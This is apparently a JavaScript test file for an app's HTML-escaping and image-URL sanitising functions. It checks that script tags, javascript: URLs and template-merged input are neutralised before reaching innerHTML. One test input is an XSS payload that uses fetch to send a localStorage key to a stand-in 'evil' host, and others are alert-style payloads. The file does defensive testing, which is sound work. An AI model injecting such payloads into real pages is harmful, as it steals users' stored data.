import { escapeHtml, escapeHtmlWithBreaks, safeImageSrc } from '../src/utils/escapeHtml.js'
import { renderText } from '../src/utils/render.js'
import { LOCAL_DATA_KEYS } from '../src/utils/localData.js'

function assert(cond, msg) {
  if (!cond) throw new Error(msg)
}

assert(escapeHtml('<img onerror=alert(1)>') === '&lt;img onerror=alert(1)&gt;', 'escape tags')
assert(escapeHtml('a&b') === 'a&amp;b', 'escape amp')
assert(escapeHtmlWithBreaks('a\nb') === 'a<br/>b', 'breaks')
assert(escapeHtmlWithBreaks('<x>\ny') === '&lt;x&gt;<br/>y', 'escape then break')

assert(safeImageSrc('javascript:alert(1)') === '', 'block javascript')
assert(safeImageSrc('data:text/html,<script>') === '', 'block non-image data')
assert(safeImageSrc('data:image/png;base64,xx') === 'data:image/png;base64,xx', 'allow data image')
assert(safeImageSrc('https://cdn.example/a.png') === 'https://cdn.example/a.png', 'allow https')
assert(safeImageSrc('') === '', 'empty')

// 模拟预览链路：占位符替换后再转义，脚本不能进 innerHTML
const xss = '<img src=x onerror="fetch(`https://evil/?k=`+localStorage.getItem(`labelprint_ai_v1`))">'
const rendered = renderText('前缀{{字段}}后缀', { 字段: xss, __id: '1' })
const html = escapeHtmlWithBreaks(rendered)
assert(!html.includes('<img'), 'xss payload escaped after merge')
assert(html.includes('&lt;img'), 'escaped lt present')
assert(html.startsWith('前缀'), 'prefix kept')

assert(LOCAL_DATA_KEYS.includes('labelprint_projects_v1'), 'projects key listed')
assert(LOCAL_DATA_KEYS.includes('labelprint_ai_v1'), 'ai key listed')

console.log('escapeHtml.test.mjs: 全部通过')
